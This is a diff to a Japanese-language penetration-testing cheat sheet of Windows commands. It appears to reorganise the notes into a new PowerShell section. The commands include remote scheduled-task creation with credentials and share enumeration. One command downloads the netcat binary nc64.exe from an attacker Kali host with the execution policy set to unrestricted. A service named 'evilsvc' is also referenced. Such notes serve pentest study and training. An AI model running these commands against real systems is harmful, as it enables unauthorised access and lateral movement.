@@ -32,8 +32,8 @@
     # /TR: 実行タスク
     schtasks /Create /S 192.168.xxx.xxx /U <user> /P <password> /TN sample /SC ONCE /SD 1900/01/01 /ST 00:00 /TR C:¥Remote¥test.bat
 
-    # タスクの一覧表示
-    schtasks /query /fo list 
+    # タスクの一覧表示(詳細)
+    schtasks /query /fo list /v
 ```
 
 * システム情報
@@ -48,8 +48,6 @@
 
 ``` bat
     mountvol
-    共有ドライブ
-    powershell -Command "Get-WmiObject -class Win32_Share"
 ```
 
 * ping sweep
@@ -67,12 +65,6 @@
 
     # 検索でよく使うファイルパターン
     *.txt/*.doc/*.xls/*.one/*.cnf/unattend.xml
-```
-
-* ファイル転送
-
-``` powershell
-    powershell -NoProfile -ExecutionPolicy unrestricted -Command (Invoke-WebRequest -Uri "http://<Remote KaliのIP>:8000/nc64.exe" -OutFile "nc64.exe")
 ```
 
 * kaliにあるwindowsで実行可能なファイル
@@ -98,4 +90,24 @@
     sc create notepad binpath= "C:¥Windows¥system32¥notepad.exe" start=auto
     # 
     sc qc evilsvc
+```
+
+## PowerShell
+
+* バージョン確認
+
+``` powershell
+    $PsVersionTable
+```
+
+* ファイル転送
+
+``` powershell
+    powershell -NoProfile -ExecutionPolicy unrestricted -Command (Invoke-WebRequest -Uri "http://<Remote KaliのIP>:8000/nc64.exe" -OutFile "nc64.exe")
+```
+
+* 共有ドライブ
+
+``` powershell
+    powershell -Command "Get-WmiObject -class Win32_Share"
 ```
